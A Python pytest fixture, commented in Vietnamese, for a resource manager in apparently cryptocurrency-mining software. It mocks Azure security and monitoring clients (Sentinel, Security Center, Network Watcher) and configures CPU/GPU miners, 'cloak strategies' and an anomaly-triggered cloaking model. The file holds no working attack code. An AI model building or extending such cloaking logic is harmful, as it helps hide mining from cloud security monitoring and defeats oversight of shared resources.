import pytest
from unittest.mock import MagicMock
from pathlib import Path
from mining_environment.scripts.resource_manager import ResourceManager  # Đảm bảo import đúng

@pytest.fixture
def resource_manager(simple_mock_logger, monkeypatch, mocker):
    """Fixture để tạo instance của ResourceManager với các tham số mock và patch các phương thức phụ thuộc."""
    # Thiết lập biến môi trường AZURE_SUBSCRIPTION_ID
    monkeypatch.setenv('AZURE_SUBSCRIPTION_ID', 'dummy_subscription_id')

    # Patch các client mà ResourceManager sử dụng
    mock_AzureMonitorClient = mocker.patch('mining_environment.scripts.resource_manager.AzureMonitorClient')

    # Các patch khác nếu cần
    mock_process_iter = mocker.patch('mining_environment.scripts.resource_manager.psutil.process_iter', return_value=[])
    mock_load_model = mocker.patch('mining_environment.scripts.resource_manager.ResourceManager.load_model', return_value=(MagicMock(), MagicMock()))
    mock_shared_resource_manager_class = mocker.patch('mining_environment.scripts.resource_manager.SharedResourceManager', autospec=True)
    mock_shutdown_power_management = mocker.patch('mining_environment.scripts.resource_manager.shutdown_power_management')  # Nếu cần
    mock_join_threads = mocker.patch('mining_environment.scripts.resource_manager.ResourceManager.join_threads')
    mock_AzureSentinelClient = mocker.patch('mining_environment.scripts.resource_manager.AzureSentinelClient')
    mock_AzureLogAnalyticsClient = mocker.patch('mining_environment.scripts.resource_manager.AzureLogAnalyticsClient')
    mock_AzureSecurityCenterClient = mocker.patch('mining_environment.scripts.resource_manager.AzureSecurityCenterClient')
    mock_AzureNetworkWatcherClient = mocker.patch('mining_environment.scripts.resource_manager.AzureNetworkWatcherClient')
    mock_AzureTrafficAnalyticsClient = mocker.patch('mining_environment.scripts.resource_manager.AzureTrafficAnalyticsClient')
    mock_AzureMLClient = mocker.patch('mining_environment.scripts.resource_manager.AzureMLClient')

    # Định nghĩa cấu hình đầy đủ với tất cả các khóa bắt buộc
    config = {
        "processes": {
            "CPU": "cpu_miner",
            "GPU": "gpu_miner"
        },
        "process_priority_map": {
            "cpu_miner": 2,
            "gpu_miner": 3
        },
        "monitoring_parameters": {
            "temperature_monitoring_interval_seconds": 10,
            "power_monitoring_interval_seconds": 10,
            "azure_monitor_interval_seconds": 300,
            "optimization_interval_seconds": 30
        },
        "temperature_limits": {
            "cpu_max_celsius": 75,
            "gpu_max_celsius": 85
        },
        "power_limits": {
            "per_device_power_watts": {
                "cpu": 150,
                "gpu": 300
            }
        },
        "resource_allocation": {
            "ram": {
                "max_allocation_mb": 2048
            },
            "network": {
                "bandwidth_limit_mbps": 100
            },
            "cache": {
                "limit_percent": 50
            },
            "gpu": {
                "max_usage_percent": [50, 75, 100]
            },
            "disk_io": {
                "min_limit_mbps": 10,
                "max_limit_mbps": 100
            }
        },
        "network_interface": "eth0",
        
        # Các khóa mới được thêm vào
        "optimization_parameters": {
            "gpu_power_adjustment_step": 10,
            "disk_io_limit_step_mbps": 5
        },
        "cloak_strategies": {
            "default": "basic_cloak"
        },
        "ai_driven_monitoring": {
            "enabled": True,
            "detection_interval_seconds": 60,
            "cloak_activation_delay_seconds": 30,
            "anomaly_cloaking_model": {
                "detection_threshold": 0.75
            }
        },
        "log_analytics": {
            "enabled": True,
            "log_level": "INFO",
            "queries": [
                "SELECT * FROM logs WHERE level='ERROR'",
                "SELECT COUNT(*) FROM logs WHERE message LIKE '%failure%'"
            ]
        },
        "alert_thresholds": {
            "cpu_load": 90,
            "gpu_load": 95
        },
        "baseline_thresholds": {
            "cpu_usage_percent": 50,
            "ram_usage_percent": 60,
            "gpu_usage_percent": 70,
            "disk_io_usage_mbps": 80,
            "network_usage_mbps": 90
        }
    }
    model_path = Path("/path/to/model.pt")

    # Khởi tạo ResourceManager với cấu hình đã được patch
    manager = ResourceManager(config, model_path, simple_mock_logger)

    # **Không thiết lập các thuộc tính thread bằng MagicMock() ở đây**

    # Trực tiếp mock các phương thức phụ thuộc trên instance
    manager.join_threads = mock_join_threads

    # Trực tiếp mock phương thức 'set' của 'stop_event'
    manager.stop_event.set = MagicMock()

    # Truy cập SharedResourceManager instance
    shared_resource_manager = manager.shared_resource_manager

    # Truy cập và thiết lập các phương thức của SharedResourceManager
    shared_resource_manager.is_gpu_initialized.return_value = True
    shared_resource_manager.adjust_cpu_threads = MagicMock()
    shared_resource_manager.adjust_gpu_usage = MagicMock()
    shared_resource_manager.adjust_ram_allocation = MagicMock()
    shared_resource_manager.adjust_disk_io_limit = MagicMock()
    shared_resource_manager.adjust_network_bandwidth = MagicMock()
    shared_resource_manager.apply_cloak_strategy = MagicMock()

    # Trực tiếp mock resource_adjustment_queue để tránh lỗi TypeError
    manager.resource_adjustment_queue = MagicMock()

    # Thêm các assert để đảm bảo các mocks đã được patch đúng cách
    assert mock_AzureMonitorClient is not None, "AzureMonitorClient chưa được patch đúng cách"
    assert mock_AzureNetworkWatcherClient is not None, "AzureNetworkWatcherClient chưa được patch đúng cách"
    assert mock_AzureTrafficAnalyticsClient is not None, "AzureTrafficAnalyticsClient chưa được patch đúng cách"
    assert mock_AzureMLClient is not None, "AzureMLClient chưa được patch đúng cách"

    return {
        'manager': manager,
        'mock_load_model': mock_load_model,
        'mock_shared_resource_manager_class': mock_shared_resource_manager_class,
        'mock_shutdown_power_management': mock_shutdown_power_management,
        'mock_join_threads': mock_join_threads,
        'mock_event_set': manager.stop_event.set,
        'simple_mock_logger': simple_mock_logger,
        'mock_shared_resource_manager_instance': shared_resource_manager,
        'mining_processes': manager.mining_processes,
        'mock_AzureMonitorClient': mock_AzureMonitorClient,
        'mock_AzureSentinelClient': mock_AzureSentinelClient,
        'mock_AzureLogAnalyticsClient': mock_AzureLogAnalyticsClient,
        'mock_AzureSecurityCenterClient': mock_AzureSecurityCenterClient,
        'mock_AzureNetworkWatcherClient': mock_AzureNetworkWatcherClient,
        'mock_AzureTrafficAnalyticsClient': mock_AzureTrafficAnalyticsClient,
        'mock_AzureMLClient': mock_AzureMLClient,
    }
